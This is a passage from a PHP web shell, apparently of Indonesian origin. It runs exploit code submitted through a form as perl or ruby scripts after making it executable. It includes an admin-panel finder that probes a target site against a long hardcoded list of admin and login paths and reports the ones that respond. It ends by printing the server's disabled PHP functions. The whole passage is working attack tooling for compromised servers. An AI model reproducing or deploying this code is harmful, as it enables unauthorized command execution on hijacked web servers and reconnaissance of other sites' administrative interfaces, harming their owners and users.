			$exe = lets_call("chmod +x $cuy; perl $cuy");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		case "rb":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("chmod +x $cuy; ruby $cuy");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		default: break;
	}
}
elseif(isset($_POST['find'])){
	echo "<pre class=\"iseng\">";
	$site = $_POST['site'];
	
	$adminlocales = array(
	"-adminweb/",
	"!adminweb/",
	"@adminweb/",
	"adminweb121/",
	"adminweb90/",
	"adminweb145/",
	"khususadmin/",
	"rahasiaadm/",
	"adminweb123123/",
	"adminweb2222/",
	"adminlanel/",
	"adminlanel.php/",
	"monitor123.php/",
	"masuk.php/",
	"css.php/", 
	"admin1235.php/", 
	"master.php/",
	"1admin/",
	"123admin/",
	"addmin/",
	"home.php",
	"css/",
	"rediect.php/",
	"masuk.php/",
	"index.php/",
	"webpaneladmin123/",
	"registeradm/",
	"register/",
	"member123/",
	"123adminweb/",
	"123paneladminweb/",
	"panelauth1231/",
	"loginadminweb21/",
	"loginadminweb123/",
	"loginadminweb/",
	"webadmin123/",
	"redakturadmin/",
	"paneladminweb/",
	"admloginadm/",
	"4dm1n/",
	"admin12345/",
	"adminweb12/",
	"adminweb111/",
	"adminweb123/",
	"adminweb1/",
	"gangmasuk/",
	"gangadmin/",
	"admredaktur/",
	"adminwebredaktur/",
	"adminredaktur/",
	"adm/", 
	"_adm_/", 
	"_admin_/", 
	"_loginadm_/", 
	"_login_admin_/", 
	"minmin", 
	"loginadmin3/",  
	"masuk/admin", 
	"webmail", 
	"_loginadmin_/", 
	"_login_admin.php_/", 
	"_admin_/", 
	"_administrator_/", 
	"operator/", 
	"sika/", 
	"adminweb/", 
	"develop/", 
	"ketua/", 
	"redaktur/", 
	"author/", 
	"admin/", 
	"administrator/", 
	"adminweb/", 
	"user/", 
	"users/", 
	"dinkesadmin/", 
	"retel/", 
	"author/", 
	"panel/", 
	"paneladmin/", 
	"panellogin/",
	"redaksi/", 
	"cp-admin/", 
	"login@web/", 
	"admin1/", 
	"admin2/", 
	"admin3/", 
	"admin4/", 
	"admin5/", 
	"admin6/", 
	"admin7", 
	"admin8", 
	"admin9",
	"admin10", 
	"master/", 
	"master/index.php", 
	"master/login.php", 
	"operator/index.php", 
	"sika/index.php", 
	"develop/index.php", 
	"ketua/index.php",
	"redaktur/index.php", 
	"admin/index.php", 
	"administrator/index.php", 
	"adminweb/index.php", 
	"user/index.php", 
	"users/index.php", 
	"dinkesadmin/index.php", 
	"retel/index.php", 
	"author/index.php", 
	"panel/index.php", 
	"paneladmin/index.php",
	"panellogin/index.php", 
	"redaksi/index.php", 
	"cp-admin/index.php", 
	"operator/login.php", 
	"sika/login.php", 
	"develop/login.php",
	"ketua/login.php",
	"redaktur/login.php",
	"admin/login.php",
	"administrator/login.php", 
	"adminweb/login.php", 
	"user/login.php", 
	"users/login.php", 
	"dinkesadmin/login.php", 
	"retel/login.php", 
	"author/login.php", 
	"panel/login.php", 
	"paneladmin/login.php", 
	"panellogin/login.php", 
	"redaksi/login.php", 
	"cp-admin/login.php", 
	"terasadmin/", 
	"terasadmin/index.php", 
	"terasadmin/login.php", 
	"rahasia/", 
	"rahasia/index.php", 
	"rahasia/admin.php", 
	"rahasia/login.php", 
	"dinkesadmin/", 
	"dinkesadmin/login.php", 
	"adminpmb/", 
	"adminpmb/index.php", 
	"adminpmb/login.php", 
	"system/", 
	"system/index.php", 
	"system/login.php", 
	"webadmin/", 
	"webadmin/index.php", 
	"webadmin/login.php", 
	"wpanel/", 
	"wpanel/index.php", 
	"wpanel/login.php", 
	"adminpanel/index.php", 
	"adminpanel/", 
	"adminpanel/login.php", 
	"adminkec/", 
	"adminkec/index.php", 
	"adminkec/login.php", 
	"admindesa/", 
	"admindesa/index.php", 
	"admindesa/login.php", 
	"adminkota/", 
	"adminkota/index.php", 
	"adminkota/login.php", 
	"admin123/", 
	"admin123/index.php", 
	"dologin/", 
	"home.asp/",
	"supervise/amdin", 
	"relogin/adm", 
	"checkuser", 
	"relogin.php", 
	"relogin.asp", 
	"wp-admin", 
	"registration", 
	"suvervise", 
	"superman.php", 
	"member.php",
	"home/admin",
	"po-admin/",
	"do_login.php", 
	"bo-login", 
	"bo_login.php/", 
	"index.php/admin", 
	"admiiin.php", 
	"masuk/adm",
	"website_login/", 
	"dashboard/admin", 
	"dashboard.php", 
	"dashboard_adm", 
	"admin123/login.php", 
	"logout1/", 
	"logout/",
	"pengelola/login", 
	"manageradm/", 
	"logout.asp", 
	"manager/adm", 
	"pengelola/web",
	"auth/panel", 
	"logout/index.php", 
	"logout/login.php", 
	"controladm/", 
	"logout/admin.php", 
	"adminweb_setting", 
	"adm/index.asp", 
	"adm.asp", 
	"affiliate.asp", 
	"adm_auth.asp", 
	"memberadmin.asp", 
	"siteadmin/login.asp", 
	"siteadmin/login", 
	"paneldecontrol", 
	"cms/admin", 
	"administracion.php", 
	"/ADMON/", 
	"administrador/", 
	"panelc/", 
	"admincp", 
	"admcp", 
	"cp", 
	"modcp", 
	"moderatorcp", 
	"adminare", 
	"cpanel", 
	"controlpanel"
	);
	foreach($adminlocales as $search){
		$headers = get_headers("$site$search");
		if(preg_match("/200/", $headers[0])){
			echo "[!] <a href=\"".$url.$search."\">$url$search</a> Founded!";
		}
		else {
			echo "[!] Not found!";
		}
	}
	echo "</pre>";
}

echo "<pre class=\"iseng\">Disable Function:&nbsp;".$dis."</pre>";
?>
<font style="font-family: Consolas"><center><?=$my_config['footer']?></center></font><br>
</body>
</html>
